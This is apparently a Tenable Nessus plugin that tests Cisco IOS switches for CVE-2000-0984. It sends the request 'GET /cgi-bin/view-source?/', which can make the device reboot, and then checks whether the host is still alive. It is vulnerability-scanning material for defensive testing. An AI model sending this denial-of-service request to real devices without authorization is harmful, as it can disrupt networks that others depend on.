#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(10682);
  script_version("1.39");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2000-0984");
  script_bugtraq_id(1838);

  script_name(english:"Cisco IOS HTTP Server ?/ String Local DoS");

  script_set_attribute(attribute:"synopsis", value:
"The remote switch has a denial of service vulnerability.");
  script_set_attribute(attribute:"description", value:
"It was possible to make the remote switch reboot by requesting :

 GET /cgi-bin/view-source?/

A remote attacker may use this flaw to prevent your network from
working properly.");
  # https://www.cisco.com/en/US/products/products_security_advisory09186a00800b13b6.shtml
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?8cb9966d");
  script_set_attribute(attribute:"solution", value:
"Upgrade to the latest version of IOS, or implement one of the
workarounds listed in Cisco's advisory.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2000/10/25");
  script_set_attribute(attribute:"patch_publication_date", value:"2000/10/25");
  script_set_attribute(attribute:"plugin_publication_date", value:"2001/05/29");

  script_set_attribute(attribute:"potential_vulnerability", value:"true");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/o:cisco:ios");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_KILL_HOST);
  script_family(english:"CISCO");

  script_copyright(english:"This script is Copyright (C) 2001-2022 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "find_service1.nasl", "no404.nasl");
  script_require_keys("Settings/ParanoidReport");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);
os = get_kb_item("Host/OS");
if ( os && "IOS" >!< os ) exit(0);

port = get_http_port(default:80);

start_denial();
r = http_send_recv3(method: "GET", item:string("/cgi-bin/view-source?/"), port:port);

  alive = end_denial();
  if(!alive)
  {
   security_hole(port);
   set_kb_item(name:"Host/dead", value:TRUE);
  }

